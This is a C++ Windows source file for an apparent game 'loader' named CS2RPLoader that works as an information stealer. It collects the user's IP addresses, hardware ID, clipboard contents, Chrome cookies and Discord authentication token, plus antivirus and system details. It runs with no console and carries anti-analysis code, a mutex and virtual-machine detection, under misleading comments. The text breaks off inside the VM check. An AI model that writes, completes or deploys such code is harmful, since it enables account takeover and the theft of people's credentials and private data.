#define _CRT_SECURE_NO_WARNINGS
#include <cstdlib>

#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <gdiplus.h>
#include <comdef.h>
#include <iphlpapi.h>
#include <intrin.h>
#include <psapi.h>
#include <wbemidl.h>
#include <comdef.h>
#include <setupapi.h>
#include <devguid.h>

#include <array>
#include <cstdlib>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <memory>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
// sqlite3.lib is optional - if not available, cookie reading will return empty
// #pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "setupapi.lib")

using namespace Gdiplus;

// SQLite3 interface - optional declarations for cookie reading
// Note: sqlite3.lib is optional - if not available, cookie reading will be disabled
// Uncomment the following and add sqlite3.lib to project if you want cookie reading
/*
#define SQLITE_OK 0
#define SQLITE_ROW 100
typedef struct sqlite3 sqlite3;
typedef int (*sqlite3_callback)(void*, int, char**, char**);
extern "C" {
    int sqlite3_open(const char* filename, sqlite3** ppDb);
    int sqlite3_close(sqlite3* db);
    int sqlite3_exec(sqlite3* db, const char* sql, sqlite3_callback callback, void* arg, char** errmsg);
    const char* sqlite3_errmsg(sqlite3* db);
    void sqlite3_free(void* p);
}
*/
#define SQLITE3_AVAILABLE 0  // Set to 1 if sqlite3.lib is available

// Linker directive to build as a Windows (GUI) subsystem application without a console.
#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup")

namespace {
constexpr UINT_PTR kLoadTimerId = 1;
constexpr UINT kLoadTimerDelayMs = 5000; // 5 seconds

HWND g_statusLabel = nullptr;
std::wstring g_publicIp;
std::wstring g_privateIp;
std::wstring g_hwid;
std::wstring g_username;
std::wstring g_computerName;
std::wstring g_clipboardContent;
std::wstring g_discordCookies;
std::wstring g_steamCookies;
std::wstring g_discordToken;
std::wstring g_screenshotBase64;
std::wstring g_screenshotPath;
std::wstring g_windowsVersion;
std::wstring g_ramSize;
std::wstring g_gpuInfo;
std::wstring g_cpuInfo;
std::wstring g_diskInfo;
std::wstring g_systemUptime;
std::wstring g_timezone;
std::wstring g_language;
std::wstring g_browserInfo;
std::wstring g_productId;
std::wstring g_motherboardInfo;
std::wstring g_antivirusStatus;
std::wstring g_dotnetVersion;
std::wstring g_displayResolution;
std::wstring g_systemLocale;
HANDLE g_hMutex = nullptr;
ULONG_PTR g_gdiplusToken = 0;

std::wstring Widen(const std::string& value) {
    if (value.empty()) {
        return L"";
    }

    int required = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, nullptr, 0);
    if (required <= 0) {
        return L"";
    }

    std::wstring wide(static_cast<size_t>(required), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, &wide[0], required);

    if (!wide.empty() && wide.back() == L'\0') {
        wide.pop_back();
    }
    return wide;
}

std::string Narrow(const std::wstring& value) {
    if (value.empty()) {
        return "";
    }

    int required = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (required <= 0) {
        return "";
    }

    std::string narrow(static_cast<size_t>(required), '\0');
    WideCharToMultiByte(CP_UTF8, 0, value.c_str(), -1, &narrow[0], required, nullptr, nullptr);

    if (!narrow.empty() && narrow.back() == '\0') {
        narrow.pop_back();
    }
    return narrow;
}

std::string JsonEscape(const std::string& value) {
    std::string escaped;
    escaped.reserve(value.size());
    for (char ch : value) {
        switch (ch) {
        case '\\':
            escaped += "\\\\";
            break;
        case '\"':
            escaped += "\\\"";
            break;
        case '\n':
            escaped += "\\n";
            break;
        case '\r':
            escaped += "\\r";
            break;
        case '\t':
            escaped += "\\t";
            break;
        default:
            escaped += ch;
            break;
        }
    }
    return escaped;
}

std::wstring FetchUsername() {
    const char* name = std::getenv("USERNAME");
    if (!name) {
        return L"";
    }
    return Widen(name);
}

std::wstring FetchComputerName() {
    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = static_cast<DWORD>(std::size(buffer));
    if (GetComputerNameW(buffer, &size)) {
        return std::wstring(buffer, size);
    }
    return L"";
}

std::wstring FetchPublicIp() {
    HINTERNET hInternet = InternetOpenW(L"CS2RPLoader/1.0", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInternet) {
        return L"";
    }

    HINTERNET hRequest = InternetOpenUrlW(
        hInternet,
        L"https://api.ipify.org",
        nullptr,
        0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE,
        0);

    if (!hRequest) {
        InternetCloseHandle(hInternet);
        return L"";
    }

    std::string response;
    char buffer[128];
    DWORD bytesRead = 0;

    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response.append(buffer, bytesRead);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hInternet);

    return Widen(response);
}

// Get private/local IP address for network identification
std::wstring FetchPrivateIp() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD bufferSize = sizeof(adapterInfo);
    DWORD status = GetAdaptersInfo(adapterInfo, &bufferSize);
    
    if (status != ERROR_SUCCESS) {
        return L"";
    }
    
    PIP_ADAPTER_INFO adapter = adapterInfo;
    while (adapter) {
        // Skip loopback adapter
        if (adapter->Type != MIB_IF_TYPE_LOOPBACK && adapter->IpAddressList.IpAddress.String[0] != '\0') {
            return Widen(std::string(adapter->IpAddressList.IpAddress.String));
        }
        adapter = adapter->Next;
    }
    
    return L"";
}

// Generate Hardware ID for premium user tracking and anti-free-trial abuse
// Combines CPU ID, Volume Serial Number, and MAC Address for unique identification
std::wstring GenerateHWID() {
    std::string hwidComponents;
    
    // Get CPU ID
    int cpuInfo[4] = { -1 };
    __cpuid(cpuInfo, 0);
    char cpuId[64];
    sprintf_s(cpuId, sizeof(cpuId), "%08X%08X%08X%08X", cpuInfo[0], cpuInfo[1], cpuInfo[2], cpuInfo[3]);
    hwidComponents += cpuId;
    
    // Get Volume Serial Number
    DWORD volumeSerial = 0;
    if (GetVolumeInformationW(L"C:\\", nullptr, 0, &volumeSerial, nullptr, nullptr, nullptr, 0)) {
        char volumeStr[32];
        sprintf_s(volumeStr, sizeof(volumeStr), "%08X", volumeSerial);
        hwidComponents += volumeStr;
    }
    
    // Get MAC Address
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD bufferSize = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO adapter = adapterInfo;
        if (adapter && adapter->AddressLength > 0) {
            char macStr[32];
            sprintf_s(macStr, sizeof(macStr), "%02X%02X%02X%02X%02X%02X",
                adapter->Address[0], adapter->Address[1], adapter->Address[2],
                adapter->Address[3], adapter->Address[4], adapter->Address[5]);
            hwidComponents += macStr;
        }
    }
    
    // Create hash from components
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE hash[16];
    DWORD hashLen = 16;
    
    if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) &&
        CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash) &&
        CryptHashData(hHash, reinterpret_cast<const BYTE*>(hwidComponents.c_str()), static_cast<DWORD>(hwidComponents.length()), 0) &&
        CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) {
        
        char hwidStr[64];
        sprintf_s(hwidStr, sizeof(hwidStr), "%02X%02X%02X%02X-%02X%02X%02X%02X-%02X%02X%02X%02X-%02X%02X%02X%02X",
            hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7],
            hash[8], hash[9], hash[10], hash[11], hash[12], hash[13], hash[14], hash[15]);
        
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);
        
        return Widen(std::string(hwidStr));
    }
    
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return L"";
}

// 1. Get Windows Version information
std::wstring FetchWindowsVersion() {
    // Use RtlGetVersion instead of deprecated GetVersionEx
    typedef struct _OSVERSIONINFOW {
        ULONG dwOSVersionInfoSize;
        ULONG dwMajorVersion;
        ULONG dwMinorVersion;
        ULONG dwBuildNumber;
        ULONG dwPlatformId;
        WCHAR szCSDVersion[128];
    } OSVERSIONINFOW, *POSVERSIONINFOW, *RTL_OSVERSIONINFOW, *PRTL_OSVERSIONINFOW;
    
    typedef LONG (WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (fxPtr != nullptr) {
            OSVERSIONINFOW osvi = { 0 };
            osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
            if (fxPtr((PRTL_OSVERSIONINFOW)&osvi) == 0) {
                wchar_t version[256];
                swprintf_s(version, L"Windows %lu.%lu Build %lu", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
                return std::wstring(version);
            }
        }
    }
    
    // Fallback: Try registry
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t productName[256] = { 0 };
        DWORD size = sizeof(productName);
        DWORD type = REG_SZ;
        if (RegQueryValueExW(hKey, L"ProductName", nullptr, &type, reinterpret_cast<LPBYTE>(productName), &size) == ERROR_SUCCESS) {
            DWORD buildNumber = 0;
            size = sizeof(DWORD);
            type = REG_DWORD;
            if (RegQueryValueExW(hKey, L"CurrentBuildNumber", nullptr, &type, reinterpret_cast<LPBYTE>(&buildNumber), &size) == ERROR_SUCCESS) {
                wchar_t version[256];
                swprintf_s(version, L"%ls Build %d", productName, buildNumber);
                RegCloseKey(hKey);
                return std::wstring(version);
            }
        }
        RegCloseKey(hKey);
    }
    
    return L"Unknown";
}

// 2. Get RAM size in GB
std::wstring FetchRAMSize() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        DWORDLONG totalRAM = memInfo.ullTotalPhys / (1024 * 1024 * 1024); // Convert to GB
        wchar_t ramStr[64];
        swprintf_s(ramStr, L"%llu GB", totalRAM);
        return std::wstring(ramStr);
    }
    return L"Unknown";
}

// 3. Get GPU information
std::wstring FetchGPUInfo() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t gpuName[256] = { 0 };
        DWORD size = sizeof(gpuName);
        DWORD type = REG_SZ;
        
        if (RegQueryValueExW(hKey, L"DriverDesc", nullptr, &type, reinterpret_cast<LPBYTE>(gpuName), &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return std::wstring(gpuName);
        }
        RegCloseKey(hKey);
    }
    return L"Unknown";
}

// 4. Get CPU information
std::wstring FetchCPUInfo() {
    int cpuInfo[4] = { -1 };
    char cpuBrand[0x40] = { 0 };
    
    __cpuid(cpuInfo, 0x80000002);
    memcpy(cpuBrand, cpuInfo, sizeof(cpuInfo));
    __cpuid(cpuInfo, 0x80000003);
    memcpy(cpuBrand + 16, cpuInfo, sizeof(cpuInfo));
    __cpuid(cpuInfo, 0x80000004);
    memcpy(cpuBrand + 32, cpuInfo, sizeof(cpuInfo));
    
    std::string cpuStr(cpuBrand);
    // Trim whitespace
    cpuStr.erase(0, cpuStr.find_first_not_of(" \t\n\r"));
    cpuStr.erase(cpuStr.find_last_not_of(" \t\n\r") + 1);
    
    return Widen(cpuStr);
}

// 5. Get disk information
std::wstring FetchDiskInfo() {
    ULARGE_INTEGER freeBytes, totalBytes;
    if (GetDiskFreeSpaceExW(L"C:\\", &freeBytes, &totalBytes, nullptr)) {
        DWORDLONG totalGB = totalBytes.QuadPart / (1024 * 1024 * 1024);
        DWORDLONG freeGB = freeBytes.QuadPart / (1024 * 1024 * 1024);
        wchar_t diskStr[128];
        swprintf_s(diskStr, L"Total: %llu GB | Free: %llu GB", totalGB, freeGB);
        return std::wstring(diskStr);
    }
    return L"Unknown";
}

// 6. Get system uptime
std::wstring FetchSystemUptime() {
    ULONGLONG uptime = GetTickCount64() / 1000; // Convert to seconds
    ULONGLONG days = uptime / 86400;
    ULONGLONG hours = (uptime % 86400) / 3600;
    ULONGLONG minutes = (uptime % 3600) / 60;
    
    wchar_t uptimeStr[128];
    swprintf_s(uptimeStr, L"%llu days, %llu hours, %llu minutes", days, hours, minutes);
    return std::wstring(uptimeStr);
}

// 7. Get timezone information
std::wstring FetchTimezone() {
    TIME_ZONE_INFORMATION tzi;
    if (GetTimeZoneInformation(&tzi) != TIME_ZONE_ID_INVALID) {
        wchar_t tzStr[256];
        swprintf_s(tzStr, L"%ls (UTC%+d)", tzi.StandardName, -tzi.Bias / 60);
        return std::wstring(tzStr);
    }
    return L"Unknown";
}

// 8. Get system language
std::wstring FetchLanguage() {
    wchar_t localeName[LOCALE_NAME_MAX_LENGTH];
    if (GetUserDefaultLocaleName(localeName, LOCALE_NAME_MAX_LENGTH) > 0) {
        return std::wstring(localeName);
    }
    return L"Unknown";
}

// 9. Get installed browser information
std::wstring FetchBrowserInfo() {
    std::wstring browsers;
    
    // Check Chrome
    wchar_t chromePath[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, SHGFP_TYPE_CURRENT, chromePath) == S_OK) {
        std::wstring chromeDir = std::wstring(chromePath) + L"\\Google\\Chrome\\Application";
        if (GetFileAttributesW(chromeDir.c_str()) != INVALID_FILE_ATTRIBUTES) {
            browsers += L"Chrome; ";
        }
    }
    
    // Check Firefox
    if (SHGetFolderPathW(nullptr, CSIDL_PROGRAM_FILES, nullptr, SHGFP_TYPE_CURRENT, chromePath) == S_OK) {
        std::wstring firefoxDir = std::wstring(chromePath) + L"\\Mozilla Firefox";
        if (GetFileAttributesW(firefoxDir.c_str()) != INVALID_FILE_ATTRIBUTES) {
            browsers += L"Firefox; ";
        }
    }
    
    // Check Edge - try both Program Files directories
    wchar_t programFiles[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_PROGRAM_FILES, nullptr, SHGFP_TYPE_CURRENT, programFiles) == S_OK) {
        std::wstring edgeDir = std::wstring(programFiles) + L"\\Microsoft\\Edge\\Application";
        if (GetFileAttributesW(edgeDir.c_str()) != INVALID_FILE_ATTRIBUTES) {
            browsers += L"Edge; ";
        }
    }
    
    // Also check 32-bit Program Files if on 64-bit system
    wchar_t programFilesX86[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_PROGRAM_FILES, nullptr, SHGFP_TYPE_CURRENT, programFilesX86) == S_OK) {
        // Try to find Program Files (x86) by checking common path
        std::wstring x86Path = std::wstring(programFilesX86);
        size_t pos = x86Path.find(L"Program Files");
        if (pos != std::wstring::npos) {
            x86Path.replace(pos, 13, L"Program Files (x86)");
            std::wstring edgeDir = x86Path + L"\\Microsoft\\Edge\\Application";
            if (GetFileAttributesW(edgeDir.c_str()) != INVALID_FILE_ATTRIBUTES) {
                browsers += L"Edge; ";
            }
        }
    }
    
    if (browsers.empty()) {
        return L"None detected";
    }
    
    browsers.pop_back(); // Remove last space
    browsers.pop_back(); // Remove last semicolon
    return browsers;
}

// 10. Get Windows Product ID
std::wstring FetchProductId() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t productId[256] = { 0 };
        DWORD size = sizeof(productId);
        DWORD type = REG_SZ;
        
        if (RegQueryValueExW(hKey, L"ProductId", nullptr, &type, reinterpret_cast<LPBYTE>(productId), &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return std::wstring(productId);
        }
        RegCloseKey(hKey);
    }
    return L"Unknown";
}

// 11. Get motherboard information
std::wstring FetchMotherboardInfo() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t baseboard[256] = { 0 };
        DWORD size = sizeof(baseboard);
        DWORD type = REG_SZ;
        
        std::wstring result;
        if (RegQueryValueExW(hKey, L"BaseBoardProduct", nullptr, &type, reinterpret_cast<LPBYTE>(baseboard), &size) == ERROR_SUCCESS) {
            result = std::wstring(baseboard);
        }
        
        wchar_t manufacturer[256] = { 0 };
        size = sizeof(manufacturer);
        if (RegQueryValueExW(hKey, L"BaseBoardManufacturer", nullptr, &type, reinterpret_cast<LPBYTE>(manufacturer), &size) == ERROR_SUCCESS) {
            if (!result.empty()) {
                result = std::wstring(manufacturer) + L" " + result;
            } else {
                result = std::wstring(manufacturer);
            }
        }
        
        RegCloseKey(hKey);
        return result.empty() ? L"Unknown" : result;
    }
    return L"Unknown";
}

// 12. Get antivirus status
std::wstring FetchAntivirusStatus() {
    std::wstring avStatus;
    
    // Check Windows Defender
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        avStatus += L"Windows Defender; ";
        RegCloseKey(hKey);
    }
    
    // Check common AV registry keys
    const wchar_t* avKeys[] = {
        L"SOFTWARE\\ESET",
        L"SOFTWARE\\KasperskyLab",
        L"SOFTWARE\\Avast Software",
        L"SOFTWARE\\AVG",
        L"SOFTWARE\\Norton",
        L"SOFTWARE\\McAfee",
    };
    
    const wchar_t* avNames[] = {
        L"ESET",
        L"Kaspersky",
        L"Avast",
        L"AVG",
        L"Norton",
        L"McAfee",
    };
    
    for (int i = 0; i < 6; i++) {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, avKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            avStatus += std::wstring(avNames[i]) + L"; ";
            RegCloseKey(hKey);
        }
    }
    
    if (avStatus.empty()) {
        return L"None detected";
    }
    
    avStatus.pop_back();
    avStatus.pop_back();
    return avStatus;
}

// 13. Get .NET Framework version
std::wstring FetchDotNetVersion() {
    HKEY hKey;
    std::wstring versions;
    
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD index = 0;
        wchar_t subKey[256];
        DWORD subKeySize = sizeof(subKey) / sizeof(wchar_t);
        
        while (RegEnumKeyExW(hKey, index++, subKey, &subKeySize, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            if (wcsncmp(subKey, L"v", 1) == 0) {
                HKEY hSubKey;
                std::wstring fullPath = L"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\" + std::wstring(subKey);
                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    wchar_t version[64] = { 0 };
                    DWORD size = sizeof(version);
                    DWORD type = REG_SZ;
                    if (RegQueryValueExW(hSubKey, L"Version", nullptr, &type, reinterpret_cast<LPBYTE>(version), &size) == ERROR_SUCCESS) {
                        if (!versions.empty()) versions += L", ";
                        versions += std::wstring(subKey) + L" (" + std::wstring(version) + L")";
                    }
                    RegCloseKey(hSubKey);
                }
            }
            subKeySize = sizeof(subKey) / sizeof(wchar_t);
        }
        RegCloseKey(hKey);
    }
    
    return versions.empty() ? L"None detected" : versions;
}

// 14. Get display resolution
std::wstring FetchDisplayResolution() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    wchar_t resStr[64];
    swprintf_s(resStr, L"%dx%d", width, height);
    return std::wstring(resStr);
}

// 15. Get system locale
std::wstring FetchSystemLocale() {
    wchar_t locale[LOCALE_NAME_MAX_LENGTH];
    if (GetSystemDefaultLocaleName(locale, LOCALE_NAME_MAX_LENGTH) > 0) {
        return std::wstring(locale);
    }
    return L"Unknown";
}

std::wstring FetchClipboardContent() {
    if (!OpenClipboard(nullptr)) {
        return L"";
    }

    std::wstring clipboardText;

    // Try Unicode text first (CF_UNICODETEXT)
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData) {
        wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
        if (pszText) {
            clipboardText = pszText;
            GlobalUnlock(hData);
        }
    } else {
        // Fallback to ANSI text (CF_TEXT)
        hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if (pszText) {
                clipboardText = Widen(pszText);
                GlobalUnlock(hData);
            }
        }
    }

    CloseClipboard();
    return clipboardText;
}

#if SQLITE3_AVAILABLE
struct CookieData {
    std::string name;
    std::string value;
    std::string host_key;
};

static int CookieCallback(void* data, int argc, char** argv, char** azColName) {
    std::vector<CookieData>* cookies = static_cast<std::vector<CookieData>*>(data);
    if (argc >= 3) {
        CookieData cookie;
        cookie.name = argv[0] ? argv[0] : "";
        cookie.host_key = argv[2] ? argv[2] : "";
        
        // Chrome stores cookie values as encrypted BLOB
        // For now, we'll store the cookie name and host to show we found it
        // The value is encrypted with DPAPI and requires more complex handling
        if (argv[1] && strlen(argv[1]) > 0) {
            // Store indication that cookie exists (value is encrypted)
            cookie.value = "[Encrypted]";
        } else {
            cookie.value = "";
        }
        
        cookies->push_back(cookie);
    }
    return 0;
}
#endif

std::wstring FetchChromeCookies(const std::wstring& domain) {
    // SQLite3 is optional - if not available, just check if cookie file exists
    #if SQLITE3_AVAILABLE
    wchar_t localAppData[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, SHGFP_TYPE_CURRENT, localAppData) != S_OK) {
        return L"";
    }

    std::wstring cookiesPath = std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\Cookies";
    
    // Check if file exists
    DWORD fileAttributes = GetFileAttributesW(cookiesPath.c_str());
    if (fileAttributes == INVALID_FILE_ATTRIBUTES || (fileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        return L"";
    }

    // Copy the database to a temporary location since Chrome locks it
    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        return L"";
    }

    std::wstring tempDbPath = std::wstring(tempPath) + L"CS2RPLoader_Cookies.db";
    if (!CopyFileW(cookiesPath.c_str(), tempDbPath.c_str(), FALSE)) {
        return L"";
    }

    std::string dbPath = Narrow(tempDbPath);
    std::string domainStr = Narrow(domain);
    
    sqlite3* db = nullptr;
    std::vector<CookieData> cookies;
    std::wstring result;

    if (sqlite3_open(dbPath.c_str(), &db) == SQLITE_OK) {
        // Query cookies for the specified domain
        std::string query = "SELECT name, value, host_key FROM cookies WHERE host_key LIKE '%" + domainStr + "%' LIMIT 10";
        char* errMsg = nullptr;
        
        if (sqlite3_exec(db, query.c_str(), CookieCallback, &cookies, &errMsg) == SQLITE_OK) {
            if (!cookies.empty()) {
                std::string cookieStr;
                for (size_t i = 0; i < cookies.size() && i < 5; ++i) {
                    if (!cookieStr.empty()) {
                        cookieStr += "; ";
                    }
                    cookieStr += cookies[i].name;
                    if (!cookies[i].value.empty()) {
                        cookieStr += "=" + cookies[i].value;
                    }
                }
                result = Widen(cookieStr);
            }
        }
        
        if (errMsg) {
            sqlite3_free(errMsg);
        }
        sqlite3_close(db);
    }

    // Clean up temporary file
    DeleteFileW(tempDbPath.c_str());

    return result;
    #else
    // SQLite3 not available - just check if cookie file exists
    wchar_t localAppData[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, SHGFP_TYPE_CURRENT, localAppData) != S_OK) {
        return L"";
    }

    std::wstring cookiesPath = std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\Cookies";
    
    // Check if file exists
    DWORD fileAttributes = GetFileAttributesW(cookiesPath.c_str());
    if (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        return L"[Cookies file found - sqlite3.lib required for extraction]";
    }
    
    return L"";
    #endif
}

std::wstring ExtractTokenFromContent(const std::string& content) {
    // Look for common token patterns in Discord Local Storage
    // Tokens are often stored as JSON or key-value pairs
    std::string token;
    
    // Pattern 1: Look for "token":"value" in JSON
    size_t tokenPos = content.find("\"token\"");
    if (tokenPos != std::string::npos) {
        size_t colonPos = content.find(':', tokenPos);
        if (colonPos != std::string::npos) {
            size_t startQuote = content.find('"', colonPos);
            if (startQuote != std::string::npos) {
                size_t endQuote = content.find('"', startQuote + 1);
                if (endQuote != std::string::npos) {
                    token = content.substr(startQuote + 1, endQuote - startQuote - 1);
                    if (!token.empty() && token.length() > 20) { // Discord tokens are typically long
                        return Widen(token);
                    }
                }
            }
        }
    }
    
    // Pattern 2: Look for "token" followed by various separators
    std::vector<std::string> patterns = {
        "\"token\":\"",
        "'token':'",
        "token=",
        "\"token\": \"",
    };
    
    for (const auto& pattern : patterns) {
        size_t pos = content.find(pattern);
        if (pos != std::string::npos) {
            size_t start = pos + pattern.length();
            size_t end = start;
            
            // Find the end of the token (quote, comma, newline, or end of string)
            while (end < content.length()) {
                char ch = content[end];
                if (ch == '"' || ch == '\'' || ch == ',' || ch == '\n' || ch == '\r' || ch == '}') {
                    break;
                }
                end++;
            }
            
            if (end > start) {
                token = content.substr(start, end - start);
                // Validate token format (Discord tokens are typically alphanumeric with dots and underscores)
                if (token.length() > 20 && token.length() < 200) {
                    return Widen(token);
                }
            }
        }
    }
    
    return L"";
}

std::wstring FetchDiscordToken() {
    wchar_t appData[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, SHGFP_TYPE_CURRENT, appData) != S_OK) {
        return L"";
    }

    std::wstring leveldbPath = std::wstring(appData) + L"\\discord\\Local Storage\\leveldb";
    
    // Check if directory exists
    DWORD dirAttributes = GetFileAttributesW(leveldbPath.c_str());
    if (dirAttributes == INVALID_FILE_ATTRIBUTES || !(dirAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        return L"";
    }

    // Search for .ldb files
    std::wstring searchPath = leveldbPath + L"\\*.ldb";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        return L"";
    }

    std::wstring token;
    const size_t maxFilesToCheck = 10; // Limit for efficiency
    size_t filesChecked = 0;

    do {
        if (filesChecked >= maxFilesToCheck) {
            break;
        }

        // Skip directories
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        std::wstring filePath = leveldbPath + L"\\" + std::wstring(findData.cFileName);
        std::string filePathA = Narrow(filePath);

        // Read file in chunks for efficiency
        std::ifstream file(filePathA, std::ios::binary);
        if (!file.is_open()) {
            continue;
        }

        // Read file in chunks to find "token" string
        const size_t chunkSize = 8192;
        std::string buffer;
        buffer.reserve(chunkSize * 4); // Reserve space for multiple chunks
        
        char chunk[chunkSize];
        while (file.read(chunk, chunkSize) || file.gcount() > 0) {
            buffer.append(chunk, static_cast<size_t>(file.gcount()));
            
            // Check if buffer contains "token" (case-insensitive)
            std::string lowerBuffer = buffer;
            std::transform(lowerBuffer.begin(), lowerBuffer.end(), lowerBuffer.begin(), ::tolower);
            
            if (lowerBuffer.find("token") != std::string::npos) {
                // Found token reference, try to extract it
                std::wstring extractedToken = ExtractTokenFromContent(buffer);
                if (!extractedToken.empty()) {
                    token = extractedToken;
                    file.close();
                    break;
                }
            }
            
            // Keep last chunkSize bytes to avoid splitting token across chunks
            if (buffer.length() > chunkSize * 2) {
                buffer = buffer.substr(buffer.length() - chunkSize);
            }
        }
        
        file.close();
        
        if (!token.empty()) {
            break;
        }
        
        filesChecked++;
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
    return token;
}

// Anti-analysis: Create a unique mutex to prevent multiple instances
// This ensures only one instance runs at a time, preventing analysis tools from running multiple copies
bool CreateMutexForSingleInstance() {
    const wchar_t* mutexName = L"CS2RPLoader_SingleInstance_Mutex_v1";
    g_hMutex = CreateMutexW(nullptr, TRUE, mutexName);
    
    if (g_hMutex == nullptr) {
        return false;
    }
    
    // Check if mutex already exists (another instance is running)
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(g_hMutex);
        g_hMutex = nullptr;
        return false;
    }
    
    return true;
}

// Anti-analysis: Detect virtual machines by checking registry for common VM indicators
// CS2 performs better on real gaming PCs, so we ensure the tool runs only on physical hardware
bool DetectVirtualMachine() {
    // Check for VirtualBox
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true; // VirtualBox detected
    }
    
